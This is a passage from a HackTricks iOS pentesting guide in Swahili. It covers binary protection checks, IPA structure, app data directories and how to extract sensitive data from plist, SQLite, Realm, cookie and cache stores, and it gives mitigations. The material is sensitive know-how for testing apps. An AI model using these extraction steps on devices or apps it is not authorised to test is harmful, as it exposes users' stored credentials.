# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia workflows** kwa kutumia zana za **jamii ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Misingi ya iOS

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Mazingira ya Majaribio

Kwenye ukurasa huu unaweza kupata habari kuhusu **simulator ya iOS**, **emulators** na **jailbreaking:**

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## Uchambuzi wa Awali

### Operesheni za Msingi za Uchunguzi wa iOS

Wakati wa uchunguzi **operesheni kadhaa zitapendekezwa** (unganisha kifaa, soma/andika/pakia/shusha faili, tumia baadhi ya zana...). Kwa hivyo, ikiwa hujui jinsi ya kufanya mojawapo ya hatua hizi, tafadhali, **anza kusoma ukurasa**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Kwa hatua zifuatazo **programu inapaswa kuwa imewekwa** kwenye kifaa na tayari kupata **faili ya IPA** ya programu.\
Soma ukurasa wa [Operesheni za Msingi za Uchunguzi wa iOS](basic-ios-testing-operations.md) kujifunza jinsi ya kufanya hivi.
{% endhint %}

### Uchambuzi wa Steti wa Msingi

Inashauriwa kutumia zana [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) kufanya Uchambuzi wa Steti wa moja kwa moja kwa faili ya IPA.

Uthibitisho wa **ulinzi uliopo kwenye binary**:

* **PIE (Position Independent Executable)**: Ikiwa imewezeshwa, programu inapakia kwenye anwani ya kumbukumbu ya kubahatisha kila wakati inapoanzishwa, ikifanya iwe ngumu kutabiri anwani yake ya kumbukumbu ya awali.

```bash
otool -hv <app-binary> | grep PIE   # Inapaswa kujumuisha bendera ya PIE
```

* **Stack Canaries**: Kuthibitisha uadilifu wa steki, thamani ya 'canary' hutiwa kwenye steki kabla ya kuita kazi na kuthibitishwa tena mara tu kazi inapomalizika.

```bash
otool -I -v <app-binary> | grep stack_chk   # Inapaswa kujumuisha alama: stack_chk_guard na stack_chk_fail
```

* **ARC (Automatic Reference Counting)**: Kuzuia kasoro za kawaida za uharibifu wa kumbukumbu

```bash
otool -I -v <app-binary> | grep objc_release   # Inapaswa kujumuisha alama ya _objc_release
```

* **Binary Iliyofichwa**: Binary inapaswa kuwa imefichwa

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # cryptid inapaswa kuwa 1
```

**Uthibitisho wa Funguo za Siri/Zisizo Salama**

* **Algoritimu Dhaifu za Hashing**

```bash
# Kwenye kifaa cha iOS
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Kwenye linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```

* **Funguo Zisizo Salama za Kupangilia**

```bash
# Kwenye kifaa cha iOS
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Kwenye linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```

* **Kazi Zisizo Salama za 'Malloc'**

```bash
# Kwenye kifaa cha iOS
otool -Iv <app> | grep -w "_malloc"

# Kwenye linux
grep -iER "_malloc"
```

* **Kazi Zisizo Salama na Zenye Udhaifu**

```bash
# Kwenye kifaa cha iOS
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Kwenye linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Uchambuzi wa Kisasa wa Msingi

Angalia uchambuzi wa kisasa ambao [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) hufanya. Utahitaji kutembea kupitia maoni tofauti na kuingiliana nao lakini itakuwa ikishikilia darasa kadhaa na kufanya mambo mengine na itakuandaa ripoti mara utakapomaliza.

### Orodha ya Programu Zilizowekwa

Tumia amri `frida-ps -Uai` kubaini **kitambulisho cha pakiti** cha programu zilizowekwa:

```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```

### Uchambuzi wa Msingi na Hooking

Jifunze jinsi ya **kuchambua vipengele vya programu** na jinsi ya **kuunganisha kwa urahisi njia na darasa** na objection:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### Muundo wa IPA

Muundo wa faili ya **IPA** ni kimsingi kama wa **paki iliyozipwa**. Kwa kubadilisha kipanuzi chake kuwa `.zip`, inaweza **kufunguliwa** ili kuonyesha maudhui yake. Ndani ya muundo huu, **Bundle** inawakilisha programu kamili iliyopakwa tayari kwa usakinishaji. Ndani, utapata saraka iliyoitwa `<JINA>.app`, ambayo inaleta pamoja rasilimali za programu.

* **`Info.plist`**: Faili hii inashikilia maelezo maalum ya usanidi wa programu.
* **`_CodeSignature/`**: Saraka hii inajumuisha faili ya plist ambayo ina saini, ikidhibitisha uadilifu wa faili zote katika bundle.
* **`Assets.car`**: Hifadhi iliyozipwa inayohifadhi faili za mali kama vile icons.
* **`Frameworks/`**: Saraka hii ina maktaba za asili za programu, ambazo zinaweza kuwa katika fomu ya faili za `.dylib` au `.framework`.
* **`PlugIns/`**: Hii inaweza kujumuisha nyongeza za programu, inayojulikana kama faili za `.appex`, ingawa mara nyingi hazipo.
* [**`Core Data`**](https://developer.apple.com/documentation/coredata): Inatumika kuhifadhi data ya kudumu ya programu yako kwa matumizi ya nje ya mtandao, kuhifadhi data ya muda, na kuongeza uwezo wa kufuta hatua kwenye programu yako kwenye kifaa kimoja. Ili kusawazisha data kati ya vifaa vingi katika akaunti moja ya iCloud, Core Data inaiga schema yako kiotomatiki kwenye chombo cha CloudKit.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): Faili ya `PkgInfo` ni njia mbadala ya kutaja aina na waumbaji wa programu au bundle yako.
* **en.lproj, fr.proj, Base.lproj**: Ni pakiti za lugha zinazohifadhi rasilimali kwa lugha hizo maalum, na rasilimali ya msingi ikiwa lugha fulani haitegemezwi.
* **Usalama**: Saraka ya `_CodeSignature/` inacheza jukumu muhimu katika usalama wa programu kwa kudhibitisha uadilifu wa faili zote zilizopakwa kupitia saini za kidijitali.
* **Usimamizi wa Mali**: Faili ya `Assets.car` hutumia uzipishaji kusimamia kwa ufanisi mali za kielelezo, muhimu kwa kuboresha utendaji wa programu na kupunguza ukubwa wake jumla.
* **Mfumo wa Mfumo na PlugIns**: Saraka hizi zinaonyesha modularity ya programu za iOS, kuruhusu watengenezaji kuongeza maktaba za namna ya kutumika tena (`Frameworks/`) na kuongeza uwezo wa programu (`PlugIns/`).
* **Ulokishaji**: Muundo unaweza kusaidia lugha nyingi, kuwezesha kufikia programu kimataifa kwa kujumuisha rasilimali kwa pakiti za lugha maalum.

**Info.plist**

**Info.plist** inatumika kama msingi wa programu za iOS, ikijumuisha data muhimu ya usanidi kwa mfumo wa **jozi za funguo-na-thamani**. Faili hii ni lazima si tu kwa programu lakini pia kwa nyongeza za programu na maktaba zilizopakwa ndani. Imeandikwa kwa muundo wa XML au muundo wa binary na inashikilia taarifa muhimu kutoka kwa ruhusa za programu hadi usanidi wa usalama. Kwa uchunguzi wa kina wa funguo zilizopo, mtu anaweza kurejelea [**Hati ya Maendeleo ya Apple**](https://developer.apple.com/documentation/bundleresources/information\_property\_list?language=objc).

Kwa wale wanaotaka kufanya kazi na faili hii kwa muundo unaoweza kufikiwa zaidi, uongofu wa XML unaweza kupatikana kwa urahisi kupitia matumizi ya `plutil` kwenye macOS (inapatikana kiasili kwenye toleo 10.2 na baadaye) au `plistutil` kwenye Linux. Amri za uongofu ni kama ifuatavyo:

* **Kwa macOS**:

```bash
$ plutil -convert xml1 Info.plist
```

* **Kwa Linux**:

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```

Miongoni mwa habari nyingi ambazo faili ya **Info.plist** inaweza kufichua, vipengele muhimu ni pamoja na maneno ya ruhusa za programu (`UsageDescription`), mipango ya URL maalum (`CFBundleURLTypes`), na mipangilio ya Usalama wa Usafirishaji wa Programu (`NSAppTransportSecurity`). Vipengele hivi, pamoja na vingine kama aina za hati za desturi zilizoagizwa/ziyozotolewa (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`), vinaweza kupatikana kwa urahisi kwa kuchunguza faili au kutumia amri ya `grep` rahisi:

```bash
$ grep -i <keyword> Info.plist
```

**Njia za Data**

Katika mazingira ya iOS, directories zimepangwa kwa kusudi maalum kwa **programu za mfumo** na **programu zilizowekwa na mtumiaji**. Programu za mfumo zinapatikana katika directory ya `/Applications`, wakati programu zilizowekwa na mtumiaji zinawekwa chini ya `/private/var/containers/`. Programu hizi hupewa kitambulisho cha kipekee kinachoitwa **128-bit UUID**, hivyo kufanya kazi ya kutafuta folda ya programu kwa mkono kuwa ngumu kutokana na uchanganyikaji wa majina ya directory.

Ili kurahisisha ugunduzi wa directory ya ufungaji wa programu iliyowekwa na mtumiaji, zana ya **objection** hutoa amri muhimu, `env`. Amri hii inaonyesha maelezo ya kina ya directory kwa programu husika. Hapa chini ni mfano wa jinsi ya kutumia amri hii:

```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```

Au kwa njia nyingine, jina la programu linaweza kutafutwa ndani ya `/private/var/containers` kwa kutumia amri ya `find`:

```bash
find /private/var/containers -name "Progname*"
```

Amri kama vile `ps` na `lsof` pia zinaweza kutumika kutambua mchakato wa programu na orodha ya faili zilizofunguliwa, mtawalia, zikitoa ufahamu katika njia za saraka za aktiva za programu:

```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```

**Folda ya Bundle:**

* **AppName.app**
* Hii ni Bundle ya Maombi kama ilivyoonekana awali katika IPA, ina data muhimu ya maombi, yaliyomo ya msingi pamoja na binary iliyokompiliwa ya maombi.
* Folda hii inaonekana kwa watumiaji, lakini **watumiaji hawawezi kuandika ndani yake**.
* Yaliyomo katika folda hii hayana **chelezo**.
* Yaliyomo katika folda hii hutumiwa kwa **uthibitisho wa saini ya nambari**.

**Folda ya Data:**

* **Documents/**
* Ina data yote iliyoanzishwa na mtumiaji. Mtumiaji wa mwisho wa maombi ndiye anayeanzisha uundaji wa data hii.
* Inaonekana kwa watumiaji na **watumiaji wanaweza kuandika ndani yake**.
* Yaliyomo katika folda hii yana **chelezo**.
* Maombi yanaweza kulemaza njia kwa kuweka `NSURLIsExcludedFromBackupKey`.
* **Library/**
* Ina **faili zote ambazo si maalum kwa mtumiaji**, kama vile **cache**, **mapendeleo**, **vidakuzi**, na faili za usanidi wa orodha ya mali (plist).
* Maombi ya iOS kawaida hutumia vijisehemu vya `Application Support` na `Caches`, lakini maombi yanaweza kuunda vijisehemu vya desturi.
* **Library/Caches/**
* Ina **faili zilizohifadhiwa kwa muda mfupi**.
* Haionekani kwa watumiaji na **watumiaji hawawezi kuandika ndani yake**.
* Yaliyomo katika folda hii hayana **chelezo**.
* OS inaweza kufuta faili za folda hii moja kwa moja wakati maombi hayapo na nafasi ya kuhifadhi inapungua.
* **Library/Application Support/**
* Ina **faili za kudumu** **zenye** **umuhimu** kwa ajili ya kuendesha maombi.
* **Haionekani** **na** **watumiaji** na watumiaji hawawezi kuandika ndani yake.
* Yaliyomo katika folda hii yana **chelezo**.
* Maombi yanaweza kulemaza njia kwa kuweka `NSURLIsExcludedFromBackupKey`.
* **Library/Preferences/**
* Hutumiwa kuhifadhi mali ambazo zinaweza **kudumu hata baada ya maombi kuanza tena**.
* Taarifa hii huokolewa, bila kufichuliwa, ndani ya sanduku la maombi katika faili ya plist iliyoitwa \[BUNDLE\_ID].plist.
* Vifunguo/vilivyo na thamani zote zilizohifadhiwa kwa kutumia `NSUserDefaults` zinaweza kupatikana katika faili hii.
* **tmp/**
* Tumia folda hii kuandika **faili za muda** ambazo hazihitaji kudumu kati ya uzinduzi wa maombi.
* Ina faili zilizohifadhiwa kwa muda mfupi.
* **Haionekani** kwa watumiaji.
* Yaliyomo katika folda hii hayana chelezo.
* OS inaweza kufuta faili za folda hii moja kwa moja wakati maombi hayapo na nafasi ya kuhifadhi inapungua.

Hebu tuangalie kwa karibu Folda ya Maombi ya iGoat-Swift (.app) ndani ya folda ya Bundle (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):

```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```

### Kugeuza Binary

Ndani ya folda ya `<jina-la-programu>.app` utapata faili ya binary inayoitwa `<jina-la-programu>`. Hii ni faili ambayo itatekelezwa. Unaweza kufanya ukaguzi wa msingi wa binary hiyo kwa kutumia zana ya **`otool`**:

```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```

**Angalia kama programu imefichwa**

Angalia kama kuna matokeo ya:

```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```

**Kuvunja sehemu ya binary**

Vunja sehemu ya maandishi:

```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```

Kutuma **sehemu ya Objective-C** ya programu ya sampuli, mtu anaweza kutumia:

```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```

Ili kupata msimbo wa Objective-C uliofupishwa zaidi unaweza kutumia [**class-dump**](http://stevenygard.com/projects/class-dump/):

```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```

Hata hivyo, chaguo bora la kuchambua faili ya binary ni: [**Hopper**](https://www.hopperapp.com/download.html?) na [**IDA**](https://www.hex-rays.com/products/ida/support/download\_freeware/).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia mifumo ya kiotomatiki** inayotumia zana za jamii **za juu zaidi** ulimwenguni.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Uhifadhi wa Data

Ili kujifunza jinsi iOS inavyohifadhi data kwenye kifaa soma ukurasa huu:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Maeneo yafuatayo ya kuhifadhi habari yanapaswa kuchunguzwa **mara baada ya kusakinisha programu**, **baada ya kuangalia kazi zote** za programu na hata baada ya **kutoka kwa mtumiaji mmoja na kuingia kwa mwingine**.\
Lengo ni kupata **habari nyeti zisizolindwa** za programu (nywila, alama za uthibitishaji), ya mtumiaji wa sasa na wa watumiaji waliowahi kuingia awali.
{% endhint %}

### Plist

Faili za **plist** ni faili za XML zilizo na **jozi za funguo-na-thamani**. Ni njia ya kuhifadhi data endelevu, kwa hivyo mara nyingi unaweza kupata **habari nyeti katika faili hizi**. Inashauriwa kuchunguza faili hizi baada ya kusakinisha programu na baada ya kutumia kwa kiasi kikubwa ili kuona ikiwa data mpya imeandikwa.

Njia ya kawaida zaidi ya kuhifadhi data katika faili za plist ni kupitia matumizi ya **NSUserDefaults**. Faili hii ya plist hufutwa ndani ya sanduku la programu katika **`Library/Preferences/<appBundleID>.plist`**

Darasa la [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) hutoa kiolesura cha programu kwa kuingiliana na mfumo wa chaguo-msingi. Mfumo wa chaguo-msingi huruhusu programu kubadilisha tabia yake kulingana na **mapendeleo ya mtumiaji**. Data iliyohifadhiwa na `NSUserDefaults` inaweza kuonekana kwenye pakiti ya programu. Darasa hili hufadhi **data** katika **faili ya plist**, lakini inakusudiwa kutumika na kiasi kidogo cha data.

Data hii haiwezi kupatikana moja kwa moja kupitia kompyuta iliyothibitishwa, lakini inaweza kupatikana kwa kufanya **chelezo**.

Unaweza **kudondosha** habari iliyohifadhiwa kwa kutumia **`NSUserDefaults`** kwa kutumia `ios nsuserdefaults get` ya objection.

Ili kupata plist zote zinazotumiwa na programu unaweza kupata ufikivu wa `/private/var/mobile/Containers/Data/Application/{APPID}` na kukimbia:

```bash
find ./ -name "*.plist"
```

Kubadilisha faili kutoka muundo wa **XML au binary (bplist)** kwenda XML, njia mbalimbali zinapatikana kulingana na mfumo wako wa uendeshaji:

**Kwa Watumiaji wa macOS:** Tumia amri ya `plutil`. Ni chombo kilichojengwa ndani ya macOS (10.2+), kimeundwa kwa lengo hili:

```bash
$ plutil -convert xml1 Info.plist
```

**Kwa Watumiaji wa Linux:** Sakinisha `libplist-utils` kwanza, kisha tumia `plistutil` kubadilisha faili yako:

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```

**Ndani ya Kikao cha Objection:** Kwa kuchambua programu za simu, amri maalum inaruhusu kubadilisha faili za plist moja kwa moja:

```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```

### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple\_ref/doc/uid/TP40001075-CH8-SW1) ni mfumo wa kusimamia safu ya mfano wa vitu katika programu yako. [Core Data inaweza kutumia SQLite kama duka lake la kudumu](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), lakini mfumo yenyewe si database. CoreData haiti encrypt data yake kwa chaguo-msingi. Hata hivyo, safu ya ziada ya encryption inaweza kuongezwa kwa CoreData. Angalia [GitHub Repo](https://github.com/project-imas/encrypted-core-data) kwa maelezo zaidi.

Unaweza kupata habari ya SQLite Core Data ya programu katika njia `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Ikiwa unaweza kufungua SQLite na kupata habari nyeti, basi umepata hitilafu ya usanidi.**

{% code title="Msimbo kutoka iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) ni duka la data la key/value lililojengwa juu ya SQLite.\
Kwa kuwa mabara ya Yap ni mabara ya sqlite unaweza kuyapata kwa kutumia amri iliyopendekezwa katika sehemu iliyopita.

### Mabara Mengine ya SQLite

Ni kawaida kwa programu kuunda mabara yao ya sqlite wenyewe. Wanaweza kuwa **wanahifadhi** **data** **nyeti** ndani yao na kuiacha bila kusimbwa. Hivyo, ni vyema kuchunguza kila bara ndani ya saraka za programu. Hivyo nenda kwenye saraka ya programu ambapo data inahifadhiwa (`/private/var/mobile/Containers/Data/Application/{APPID}`)

```bash
find ./ -name "*.sqlite" -or -name "*.db"
```

### Mifumo ya Takwimu Halisi za Firebase

Wabunifu wanaweza **kuhifadhi na kusawazisha data** ndani ya **hifadhidata iliyowekwa kwenye wingu bila muundo** kupitia Mifumo ya Takwimu Halisi ya Firebase. Data iliyohifadhiwa kwa muundo wa JSON, hufanyiwa usawazishaji kwa wateja wote waliounganishwa kwa wakati halisi.

Unaweza kupata jinsi ya kuchunguza mifumo ya takwimu halisi ya Firebase iliyowekwa vibaya hapa:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Mifumo ya Takwimu za Realm

[Realm Objective-C](https://realm.io/docs/objc/latest/) na [Realm Swift](https://realm.io/docs/swift/latest/) hutoa mbadala wenye nguvu kwa uhifadhi wa data, ambao hautoi na Apple. Kwa chaguo-msingi, hifadhidata hizi **huhifadhi data bila kufichuliwa**, na encryption inapatikana kupitia usanidi maalum.

Mifumo ya takwimu iko katika: `/private/var/mobile/Containers/Data/Application/{APPID}`. Kuchunguza faili hizi, mtu anaweza kutumia amri kama:

```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```

Kwa kuangalia faili hizi za database, zana ya [**Realm Studio**](https://github.com/realm/realm-studio) inapendekezwa.

Kutekeleza encryption ndani ya database ya Realm, unaweza kutumia msururu wa kanuni ufuatao:

```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```

### Databases za Couchbase Lite

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) inaelezwa kama injini ya **database** iliyo **nyepesi** na **iliyowekwa** ambayo inafuata njia ya **kuhifadhi hati** (NoSQL). Imetengenezwa kuwa ya asili kwa **iOS** na **macOS**, inatoa uwezo wa kusawazisha data kwa urahisi.

Ili kutambua databases za Couchbase zinazowezekana kwenye kifaa, directory ifuatayo inapaswa kukaguliwa:

```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```

### Vidakuzi

iOS hifadhi vidakuzi vya programu katika **`Library/Cookies/cookies.binarycookies`** ndani ya folda ya kila programu. Hata hivyo, waendelezaji mara kwa mara huchagua kuziweka katika **keychain** kwa kuwa **faili ya kuki iliyotajwa inaweza kupatikana katika nakala za dhamana**.

Kutazama faili za vidakuzi unaweza kutumia [**script hii ya python**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) au tumia **`ios cookies get`** ya objection.\
**Unaweza pia kutumia objection** kubadilisha faili hizi kuwa muundo wa JSON na kutazama data.

```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```

### Cache

Kwa chaguo-msingi, NSURLSession hifadhi data, kama vile **maombi na majibu ya HTTP katika database ya Cache.db**. Hii database inaweza kuwa na **data nyeti**, ikiwa vitambulisho, majina ya watumiaji au habari nyeti nyingine imehifadhiwa. Ili kupata habari iliyohifadhiwa fungua saraka ya data ya programu (`/var/mobile/Containers/Data/Application/<UUID>`) na nenda kwenye `/Library/Caches/<Bundle Identifier>`. **Cache ya WebKit pia inahifadhiwa katika faili ya Cache.db**. **Objection** inaweza kufungua na kuingiliana na database kwa amri `sqlite connect Cache.db`, kwani ni **database ya SQLite ya kawaida**.

Inashauriwa **kulemaza kuhifadhi data hii**, kwani inaweza kuwa na habari nyeti katika ombi au majibu. Orodha ifuatayo inaonyesha njia tofauti za kufanikisha hili:

1. Inashauriwa kuondoa majibu yaliyohifadhiwa baada ya kujiondoa. Hii inaweza kufanywa na njia iliyotolewa na Apple inayoitwa [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses) Unaweza kuita njia hii kama ifuatavyo:

`URLCache.shared.removeAllCachedResponses()`

Njia hii itaondoa maombi yote yaliyohifadhiwa na majibu kutoka kwenye faili ya Cache.db. 2. Ikiwa hauitaji kutumia faida ya vidakuzi inashauriwa kutumia tu mali ya usanidi ya [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) ya URLSession, ambayo italemaza kuhifadhi vidakuzi na Cache.

[Hati ya Apple](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Kitu cha usanidi wa kikao cha muda mfupi ni sawa na usanidi wa kikao wa chaguo-msingi (angalia chaguo-msingi), isipokuwa kwamba kikao kinacholingana hakiweki caches, hifadhi za siri, au data yoyote inayohusiana na kikao kwenye diski. Badala yake, data inayohusiana na kikao inahifadhiwa kwenye RAM. Wakati pekee kikao cha muda mfupi kinapoandika data kwenye diski ni wakati unapomwambia aandike maudhui ya URL kwenye faili.` 3. Cache inaweza pia kulemazwa kwa kuweka Sera ya Cache kuwa [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). Italemaza kuhifadhi Cache kwa njia yoyote, iwe kwenye kumbukumbu au kwenye diski.

### Snapshots

